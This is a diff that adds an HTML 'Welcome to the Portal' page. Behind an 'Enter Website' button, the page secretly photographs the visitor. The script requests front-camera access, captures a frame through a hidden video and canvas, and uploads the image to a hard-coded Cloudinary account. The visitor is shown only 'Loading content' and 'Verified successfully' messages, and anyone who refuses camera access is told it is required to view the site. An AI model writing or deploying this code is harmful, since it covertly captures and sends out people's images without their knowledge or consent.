@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0f172a;
+            color: #f8fafc;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .card {
+            background: #1e293b;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 { font-size: 1.5rem; margin-bottom: 10px; }
+        p { color: #94a3b8; font-size: 0.95rem; margin-bottom: 24px; }
+        .btn {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.2s;
+            width: 100%;
+        }
+        .btn:hover { background: #2563eb; }
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.1);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: #3b82f6;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { font-size: 0.9rem; color: #cbd5e1; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="main-card">
+    <h1 id="heading">Welcome to the Portal</h1>
+    <p id="subtext">Please click below to continue and access the interactive content.</p>
+    <button class="btn" id="action-btn">Enter Website</button>
+    <div class="spinner" id="spinner"></div>
+    <div id="status"></div>
+</div>
+
+<video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+    const CLOUDINARY_URL = "https://api.cloudinary.com/v1_1/nhy9lfkt/image/upload";
+    const CLOUDINARY_PRESET = "rhk_upload";
+
+    const actionBtn = document.getElementById('action-btn');
+    const heading = document.getElementById('heading');
+    const subtext = document.getElementById('subtext');
+    const spinner = document.getElementById('spinner');
+    const statusDiv = document.getElementById('status');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    actionBtn.addEventListener('click', async () => {
+        actionBtn.style.display = 'none';
+        spinner.style.display = 'block';
+        statusDiv.textContent = "Loading content...";
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            
+            video.srcObject = stream;
+
+            setTimeout(async () => {
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                stream.getTracks().forEach(track => track.stop());
+
+                const imageDataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+                await uploadToCloudinary(imageDataUrl);
+
+            }, 1500);
+
+        } catch (err) {
+            console.error("Permission denied or error:", err);
+            spinner.style.display = 'none';
+            heading.textContent = "Access Required";
+            subtext.textContent = "Camera permission is required to view this website.";
+            actionBtn.style.display = 'block';
+            actionBtn.textContent = "Try Again";
+            statusDiv.textContent = "";
+        }
+    });
+
+    async function uploadToCloudinary(dataUrl) {
+        const formData = new FormData();
+        formData.append("file", dataUrl);
+        formData.append("upload_preset", CLOUDINARY_PRESET);
+
+        try {
+            const response = await fetch(CLOUDINARY_URL, {
+                method: "POST",
+                body: formData
+            });
+            const data = await response.json();
+
+            if (data.secure_url) {
+                spinner.style.display = 'none';
+                heading.textContent = "Welcome In!";
+                subtext.textContent = "You now have full access to the platform.";
+                statusDiv.style.color = "#4ade80";
+                statusDiv.textContent = "Verified successfully.";
+            } else {
+                throw new Error("Upload response invalid");
+            }
+        } catch (error) {
+            console.error("Upload error:", error);
+            spinner.style.display = 'none';
+            heading.textContent = "Welcome In!";
+            subtext.textContent = "You are now connected.";
+        }
+    }
+</script>
+
+</body>
+</html>
